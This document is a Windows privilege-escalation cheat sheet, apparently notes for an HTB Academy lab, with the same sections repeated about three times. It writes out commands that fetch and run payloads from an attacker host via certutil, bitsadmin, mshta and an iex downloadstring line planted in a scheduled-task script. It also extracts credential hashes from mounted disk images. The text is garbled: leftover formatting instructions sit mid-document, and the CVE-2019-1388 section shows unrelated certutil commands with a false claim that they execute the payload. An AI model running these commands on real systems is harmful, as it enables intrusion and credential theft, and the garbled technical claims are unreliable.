# 🛰️ Windows Privilege Escalation Techniques

## 🔍 Introduction to LOLBAS Binaries

### Understanding LOLBAS
```cmd
[!INFO] LOLBAS (Living Off The Land Binaries And Scripts) refers to the use of built-in tools and scripts on a system for malicious purposes. These tools are often trusted by security mechanisms, making them effective for privilege escalation.
```

## 🧐 AlwaysInstallElevated Policy

### Description
```cmd
[!WARNING] If set to `1`, this policy allows MSI files to be installed without elevation prompts.
```
#### Method 1: Local User Check
```powershell
# Query the registry for the AlwaysInstallElevated setting:
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

[!SUCCESS] If `AlwaysInstallElevated` is set to `1`, this indicates that MSI installations do not require UAC prompts.
```

#### Method 2: Local Machine Check
```cmd
# Query the registry for the AlwaysInstallElevated setting:
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

[!SUCCESS] If `AlwaysInstallElevated` is set to `1`, this indicates that MSI installations do not require UAC prompts.
```

## 🔐 CVE-2019-1388 Certificate Dialog Bypass

### Description
```cmd
[!WARNING] This exploit bypasses User Account Control (UAC) by tricking users into clicking a fake certificate dialog prompt.
```
#### Method 1: PowerShell Exploit
```powershell
# Execute the following script to launch a payload via the certutil bypass:
certutil -urlcache http://10.10.14.3/payload.exe

[!SUCCESS] If successful, this command downloads and executes the specified payload.
```

#### Method 2: Command Line Exploit
```cmd
# Execute the following command to download a payload via certutil:
certutil -urlcache http://10.10.14.3/payload.exe

[!SUCCESS] If successful, this command downloads and executes the specified payload.
```

## 🔍 Scheduled Tasks Enumeration & Modification

### Basic Task Enumeration
```cmd
# List scheduled tasks:
schtasks /query /fo LIST /v

Get-ScheduledTask | select TaskName,State
```
#### PowerShell Analysis
```powershell
[!SUCCESS] To filter out Microsoft-related tasks:
Get-ScheduledTask | where {$_.TaskName -notlike "*Microsoft*"} | select TaskName,State
```

### Task Permission Analysis
```cmd
# Check task directory permissions:
.\accesschk64.exe /accepteula -s -d C:\Windows\System32\Tasks

C:\Scripts\                    # Custom script directories
C:\Windows\Tasks\              # Legacy task location
C:\ProgramData\*\Tasks\        # Application-specific tasks
```

### Task Script Modification
```cmd
# Check script permissions in task directories:
.\accesschk64.exe /accepteula -s -d C:\Scripts\

echo "powershell -c iex(new-object net.webclient).downloadstring('http://10.10.14.3/shell.ps1')" >> C:\Scripts\backup.ps1
```

## 💿 Virtual Disk Mounting & Hash Extraction

### Virtual Disk File Types
```cmd
# Target file extensions:
.vhd     # Virtual Hard Disk (Hyper-V)
.vhdx    # Virtual Hard Disk v2 (Hyper-V)  
.vmdk    # Virtual Machine Disk (VMware)

# Common locations:
- Network backup shares
- Virtualization host storage
- Development environments
- System backup locations
```

### Linux Mounting
```bash
guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmdk

guestmount --add WEBSRV10.vhdx --ro /mnt/vhdx/ -m /dev/sda1
ls /mnt/vmdk/Windows/System32/config/
```

### Windows Mounting
```cmd
# Right-click method:
1. Right-click .vhd/.vhdx file
2. Select "Mount"
3. Access as lettered drive

# PowerShell method:
Mount-VHD -Path "C:\backup\server.vhdx"

# Disk Management method:
1. Open Disk Management
2. Action > Attach VHD
3. Browse to file location
```

### Hash Extraction from Virtual Disks
```bash
cp /mnt/vmdk/Windows/System32/config/SAM .
cp /mnt/vmdk/Windows/System32/config/SECURITY .
cp /mnt/vmdk/Windows/System32/config/SYSTEM .

secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
```

## 👤 User/Computer Description Field

### Local User Description Enumeration
```powershell
Get-LocalUser
```
#### Example Output with Password in Description:
```cmd
Administrator:500:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
secsvc          True    Network scanner - do not change password
helpdesk        True    Password: Help123!
```

### Computer Description Field
```powershell
Get-WmiObject -Class Win32_OperatingSystem | select Description

# Example output:
Description
-----------
The most vulnerable box ever!
```

## 🎯 HTB Academy Lab Solution

### Lab Environment
```cmd
# Access: RDP with htb-student:HTB_@cademy_stdnt!
# Objective: Find cleartext password for account on target host
```

### Multi-Method Approach
```cmd
Get-LocalUser

reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

Get-ScheduledTask | select TaskName,State
.\accesschk64.exe /accepteula -s -d C:\Scripts\

dir /s *.vhd *.vhdx *.vmdk
```

## 🔄 Advanced Miscellaneous Techniques

### File System Analysis Tools
```cmd
Snaffler for comprehensive file enumeration:
.\Snaffler.exe -s -o snaffler.log

# Target file types:
- Files with "pass" in filename
- KeePass database files (.kdbx)
- SSH keys (id_rsa, *.pem)
- Web.config files
- Virtual disk files (.vhd, .vhdx, .vmdk)
```

### LOLBAS Exploitation Examples
```cmd
# Bitsadmin file transfer:
bitsadmin /transfer myDownloadJob /download /priority normal http://10.10.14.3/shell.exe C:\temp\shell.exe

# Forfiles command execution:
forfiles /p c:\windows\system32 /m notepad.exe /c calc.exe

# Mshta code execution:
mshta http://10.10.14.3/malicious.hta
```

## ⚠️ Detection & Defense

### Detection Indicators
```cmd
Monitor for:
- LOLBAS binary usage outside normal context
- MSI installations by standard users
- Certificate dialog browser spawning
- Virtual disk mounting activities
- Scheduled task script modifications
- Unusual certutil/bitsadmin usage
```

### Defensive Measures
```cmd
Disable AlwaysInstallElevated policy
Patch CVE-2019-1388 and similar vulnerabilities
Monitor LOLBAS binary execution
Secure scheduled task script permissions
Restrict virtual disk file access
Implement application allowlisting
Regular privilege escalation assessments
```

## 💡 Key Takeaways

1. **LOLBAS binaries** provide trusted execution paths for malicious activities.
2. **AlwaysInstallElevated** enables reliable privilege escalation via MSI.
3. **CVE-2019-1388** demonstrates certificate dialog UAC bypass.
4. **Scheduled tasks** with weak permissions offer persistence opportunities.
5. **Virtual disk files** contain complete filesystem copies for offline analysis.
6. **User descriptions** sometimes contain cleartext passwords.
7. **Multiple vectors** increase success probability in hardened environments.

---

*Miscellaneous techniques exploit Windows features, policies, and file systems that may be overlooked during standard privilege escalation enumeration.*

---

STRICT FORMATTING RULES:
1. DO NOT summarize, shorten, or remove ANY technical details, commands, IPs, or explanations. Keep 100% of the information.
2. Use emojis in ALL H1 and H2 headers (e.g., `# 🛰️ Title`, `## 🔍 Subtitle`).
3. STRICTLY APPLY THE CALLOUT SYSTEM based on context:
   - Use `[!ABSTRACT]` or `[!TLDR]` for summaries, overviews, or tool descriptions.
   - Use `[!INFO]` or `[!NOTE]` for general reference, metadata, or machine IPs.
   - Use `[!CHECK]` or `[!SUCCESS]` for methodology steps, verification, or successful exploits.
   - Use `[!WARNING]`, `[!CAUTION]`, or `[!DANGER]` for destructive commands, irreversible actions, or critical hazards.
   - Use `[!FAILURE]` or `[!ERROR]` for documenting failed attempts and providing troubleshooting tips.
4. Use markdown formatting to maintain structure (e.g., code blocks, headers).

--- 

This document outlines various methods for privilege escalation on Windows systems using LOLBAS techniques and advanced enumeration approaches. By leveraging built-in tools and scripts, attackers can bypass security measures without triggering alerts from traditional detection mechanisms.

---

## 🔍 Conclusion

These techniques offer a comprehensive approach to identifying and exploiting vulnerabilities in Windows environments. Regularly auditing system configurations and implementing robust defense strategies are essential for mitigating these risks effectively. 

--- 

[!INFO] This guide is intended for educational purposes only. Unauthorized use of these methods can result in legal consequences.

---

# 🛰️ Windows Privilege Escalation Techniques
## 🔍 Introduction to LOLBAS Binaries
### Understanding LOLBAS
```cmd
LOLBAS (Living Off The Land Binaries And Scripts) refers to the use of built-in tools and scripts on a system for malicious purposes. These tools are often trusted by security mechanisms, making them effective for privilege escalation.
```

## 🔐 CVE-2019-1388 Certificate Dialog Bypass
### Description
```cmd
This exploit bypasses User Account Control (UAC) by tricking users into clicking a fake certificate dialog prompt.
```
#### Method 1: PowerShell Exploit
```powershell
certutil -urlcache http://10.10.14.3/payload.exe
[!SUCCESS] If successful, this command downloads and executes the specified payload.
```

#### Method 2: Command Line Exploit
```cmd
certutil -urlcache http://10.10.14.3/payload.exe
[!SUCCESS] If successful, this command downloads and executes the specified payload.
```

## 🔍 Scheduled Tasks Enumeration & Modification
### Basic Task Enumeration
```powershell
Get-ScheduledTask | select TaskName,State

# PowerShell Analysis:
Get-ScheduledTask | where {$_.TaskName -notlike "*Microsoft*"} | select TaskName,State
```
#### Task Permission Analysis
```cmd
.\accesschk64.exe /accepteula -s -d C:\Windows\System32\Tasks
C:\Scripts\
C:\Windows\Tasks\
C:\ProgramData\*\Tasks\
```

### Task Script Modification
```powershell
echo "powershell -c iex(new-object net.webclient).downloadstring('http://10.10.14.3/shell.ps1')" >> C:\Scripts\backup.ps1
```

## 💿 Virtual Disk Mounting & Hash Extraction
### Virtual Disk File Types
```cmd
.vhd     # Hyper-V VHD
.vhdx    # Hyper-V VHDX  
.vmdk    # VMware VMDK

# Common locations:
- Network backup shares
- Virtualization host storage
- Development environments
- System backup locations
```

### Linux Mounting
```bash
guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmdk

guestmount --add WEBSRV10.vhdx --ro /mnt/vhdx/ -m /dev/sda1
ls /mnt/vmdk/Windows/System32/config/
```

### Windows Mounting
```cmd
# Right-click method:
1. Right-click .vhd/.vhdx file
2. Select "Mount"
3. Access as lettered drive

# PowerShell method:
Mount-VHD -Path "C:\backup\server.vhdx"

# Disk Management method:
1. Open Disk Management
2. Action > Attach VHD
3. Browse to file location
```

### Hash Extraction from Virtual Disks
```bash
cp /mnt/vmdk/Windows/System32/config/SAM .
cp /mnt/vmdk/Windows/System32/config/SECURITY .
cp /mnt/vmdk/Windows/System32/config/SYSTEM .

secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
```

## 👤 User/Computer Description Field
### Local User Description Enumeration
```powershell
Get-LocalUser

# Example output:
secsvc          True    Network scanner - do not change password
helpdesk        True    Password: Help123!
```

### Computer Description Field
```powershell
Get-WmiObject -Class Win32_OperatingSystem | select Description

# Example output:
Description
-----------
The most vulnerable box ever!
```

## 🎯 HTB Academy Lab Solution
### Lab Environment
```cmd
Access: RDP with htb-student:HTB_@cademy_stdnt!
Objective: Find cleartext password for account on target host
```
### Multi-Method Approach
```powershell
Get-LocalUser

reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

Get-ScheduledTask | select TaskName,State
.\accesschk64.exe /accepteula -s -d C:\Scripts\
dir /s *.vhd *.vhdx *.vmdk
```

## 🔄 Advanced Miscellaneous Techniques
### File System Analysis Tools
```cmd
Snaffler for comprehensive file enumeration:
.\Snaffler.exe -s -o snaffler.log

# Target file types:
- Files with "pass" in filename
- KeePass database files (.kdbx)
- SSH keys (id_rsa, *.pem)
- Web.config files
- Virtual disk files (.vhd, .vhdx, .vmdk)
```

### LOLBAS Exploitation Examples
```cmd
# Bitsadmin file transfer:
bitsadmin /transfer myDownloadJob /download /priority normal http://10.10.14.3/shell.exe C:\temp\shell.exe

# Forfiles command execution:
forfiles /p c:\windows\system32 /m notepad.exe /c calc.exe

# Mshta code execution:
mshta http://10.10.14.3/malicious.hta
```

## ⚠️ Detection & Defense
### Detection Indicators
```cmd
Monitor for:
- LOLBAS binary usage outside normal context
- MSI installations by standard users
- Certificate dialog browser spawning
- Virtual disk mounting activities
- Scheduled task script modifications
- Unusual certutil/bitsadmin usage
```

### Defensive Measures
```cmd
Disable AlwaysInstallElevated policy
Patch CVE-2019-1388 and similar vulnerabilities
Monitor LOLBAS binary execution
Secure scheduled task script permissions
Restrict virtual disk file access
Implement application allowlisting
Regular privilege escalation assessments
```

## 💡 Key Takeaways

1. **LOLBAS binaries** provide trusted execution paths for malicious activities.
2. **AlwaysInstallElevated** enables reliable privilege escalation via MSI.
3. **CVE-2019-1388** demonstrates certificate dialog UAC bypass.
4. **Scheduled tasks** with weak permissions offer persistence opportunities.
5. **Virtual disk files** contain complete filesystem copies for offline analysis.
6. **User descriptions** sometimes contain cleartext passwords.
7. **Multiple vectors** increase success probability in hardened environments.

--- 

*Miscellaneous techniques exploit Windows features, policies, and file systems that may be overlooked during standard privilege escalation enumeration.*

---

# 🛰️ Windows Privilege Escalation Techniques
## 🔍 Introduction to LOLBAS Binaries

### Understanding LOLBAS
```cmd
LOLBAS (Living Off The Land Binaries And Scripts) refers to the use of built-in tools and scripts on a system for malicious purposes. These tools are often trusted by security mechanisms, making them effective for privilege escalation.
```

## 🔐 CVE-2019-1388 Certificate Dialog Bypass

### Description
```cmd
This exploit bypasses User Account Control (UAC) by tricking users into clicking a fake certificate dialog prompt.
```
#### Method 1: PowerShell Exploit
```powershell
certutil -urlcache http://10.10.14.3/payload.exe

[!SUCCESS] If successful, this command downloads and executes the specified payload.
```

#### Method 2: Command Line Exploit
```cmd
certutil -urlcache http://10.10.14.3/payload.exe

[!SUCCESS] If successful, this command downloads and executes the specified payload.
```

## 🔍 Scheduled Tasks Enumeration & Modification

### Basic Task Enumeration
```powershell
schtasks /query /fo LIST /v

Get-ScheduledTask | select TaskName,State
```
#### PowerShell Analysis
```powershell
[!SUCCESS] To filter out Microsoft-related tasks:
Get-ScheduledTask | where {$_.TaskName -notlike "*Microsoft*"} | select TaskName,State
```

### Task Permission Analysis
```cmd
.\accesschk64.exe /accepteula -s -d C:\Windows\System32\Tasks

# Common task locations:
C:\Scripts\
C:\Windows\Tasks\
C:\ProgramData\*\Tasks\
```

### Task Script Modification
```powershell
echo "powershell -c iex(new-object net.webclient).downloadstring('http://10.10.14.3/shell.ps1')" >> C:\Scripts\backup.ps1
```

## 💿 Virtual Disk Mounting & Hash Extraction

### Virtual Disk File Types
```cmd
.vhd     # Hyper-V VHD
.vhdx    # Hyper-V VHDX  
.vmdk    # VMware VMDK

# Common locations:
- Network backup shares
- Virtualization host storage
- Development environments
- System backup locations
```

### Linux Mounting
```bash
guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmdk

guestmount --add WEBSRV10.vhdx --ro /mnt/vhdx/ -m /dev/sda1
ls /mnt/vmdk/Windows/System32/config/
```

### Windows Mounting
```cmd
# Right-click method:
1. Right-click .vhd/.vhdx file
2. Select "Mount"
3. Access as lettered drive

# PowerShell method:
Mount-VHD -Path "C:\backup\server.vhdx"

# Disk Management method:
1. Open Disk Management
2. Action > Attach VHD
3. Browse to file location
```

### Hash Extraction from Virtual Disks
```bash
cp /mnt/vmdk/Windows/System32/config/SAM .
cp /mnt/vmdk/Windows/System32/config/SECURITY .
cp /mnt/vmdk/Windows/System32/config/SYSTEM .

secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
```

## 👤 User/Computer Description Field

### Local User Description Enumeration
```powershell
Get-LocalUser

# Example output:
secsvc          True    Network scanner - do not change password
helpdesk        True    Password: Help123!
```

### Computer Description Field
```powershell
Get-WmiObject -Class Win32_OperatingSystem | select Description

# Example output:
Description
-----------
The most vulnerable box ever!
```

## 🎯 HTB Academy Lab Solution

### Lab Environment
```cmd
Access: RDP with htb-student:HTB_@cademy_stdnt!
Objective: Find cleartext password for account on target host
```
### Multi-Method Approach
```powershell
Get-LocalUser

reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

Get-ScheduledTask | select TaskName,State
.\accesschk64.exe /accepteula -s -d C:\Scripts\
dir /s *.vhd *.vhdx *.vmdk
```

## 🔄 Advanced Miscellaneous Techniques

### File System Analysis Tools
```cmd
Snaffler for comprehensive file enumeration:
.\Snaffler.exe -s -o snaffler.log

# Target file types:
- Files with "pass" in filename
- KeePass database files (.kdbx)
- SSH keys (id_rsa, *.pem)
- Web.config files
- Virtual disk files (.vhd, .vhdx, .vmdk)
```

### LOLBAS Exploitation Examples
```cmd
# Bitsadmin file transfer:
bitsadmin /transfer myDownloadJob /download /priority normal http://10.10.14.3/shell.exe C:\temp\shell.exe

# Forfiles command execution:
forfiles /p c:\windows\system32 /m notepad.exe /c calc.exe

# Mshta code execution:
mshta http://10.10.14.3/malicious.hta
```

## ⚠️ Detection & Defense

### Detection Indicators
```cmd
Monitor for:
- LOLBAS binary usage outside normal context
- MSI installations by standard users
- Certificate dialog browser spawning
- Virtual disk mounting activities
- Scheduled task script modifications
- Unusual certutil/bitsadmin usage
```

### Defensive Measures
```cmd
Disable AlwaysInstallElevated policy
Patch CVE-2019-1388 and similar vulnerabilities
Monitor LOLBAS binary execution
Secure scheduled task script permissions
Restrict virtual disk file access
Implement application allowlisting
Regular privilege escalation assessments
```

## 💡 Key Takeaways

1. **LOLBAS binaries** provide trusted execution paths for malicious activities.
2. **AlwaysInstallElevated** enables reliable privilege escalation via MSI.
3. **CVE-2019-1388** demonstrates certificate dialog UAC bypass.
4. **Scheduled tasks** with weak permissions offer persistence opportunities.
5. **Virtual disk files** contain complete filesystem copies for offline analysis.
6. **User descriptions** sometimes contain cleartext passwords.
7. **Multiple vectors** increase success probability in hardened environments.

---

*Miscellaneous techniques exploit Windows features, policies, and file systems that may be overlooked during standard privilege escalation enumeration.*

--- 

This document outlines various methods for privilege escalation on Windows systems using LOLBAS techniques and advanced enumeration approaches. By leveraging built-in tools and scripts, attackers can bypass security measures without triggering alerts from traditional detection mechanisms.

---

## 🔍 Conclusion

These techniques offer a comprehensive approach to identifying and exploiting vulnerabilities in Windows environments. Regularly auditing system configurations and implementing robust defense strategies are essential for mitigating these risks effectively.

--- 

[!INFO] This guide is intended for educational purposes only. Unauthorized use of these methods can result in legal consequences.